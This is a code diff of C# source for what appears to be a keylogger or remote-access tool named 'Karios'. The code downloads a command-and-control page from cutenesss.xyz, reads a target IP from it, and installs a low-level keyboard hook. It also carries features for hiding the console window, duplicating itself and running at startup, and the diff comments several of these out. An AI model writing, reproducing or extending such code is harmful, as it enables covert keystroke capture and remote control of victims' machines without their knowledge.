@@ -28,30 +28,35 @@ namespace Karios
         public static void Main()
         {
             var handle = GetConsoleWindow();
-            //start C&C func
+
+
+
             using (WebClient wc = new WebClient())
             {
                 try
                 {
                     string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
                     if (!webData.ToUpperInvariant().Contains("Keyonline"))
-                    // Hide the window
-                    ShowWindow(handle, SW_HIDE);
-                    // Persitance feature
-                    //Duplicate(); 
-                    // Run on startup 
-                    //SetStartup();
-                    // Start Application
-                    _hookID = SetHook(_proc);
-                    Application.Run();  
-                    UnhookWindowsHookEx(_hookID);
-                    if (!webData.ToUpperInvariant().Contains("ip:"))
                     {
-                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfgqwertyuiopasdf";
-                        string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
-                        IPTarget = IPTarget.Replace(@"</p>", "");
-                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
-                        IPTarget = GlobalTargetIP;
+
+                        // Hide the window
+                        //ShowWindow(handle, SW_HIDE);
+                        // Persitance feature
+                        //Duplicate(); 
+                        // Run on startup 
+                        //SetStartup();
+                        // Start Application
+                        _hookID = SetHook(_proc);
+                        //Application.Run();  
+                        UnhookWindowsHookEx(_hookID);
+                        if (!webData.ToUpperInvariant().Contains("ip:"))
+                        {
+                            string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfgqwertyuiopasdf";
+                            string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
+                            IPTarget = IPTarget.Replace(@"</p>", "");
+                            // IPTarget = IP on cutenesss.xyz/SteamerTest.html
+                            IPTarget = GlobalTargetIP;
+                        }
                     }
                 }
                 catch { }
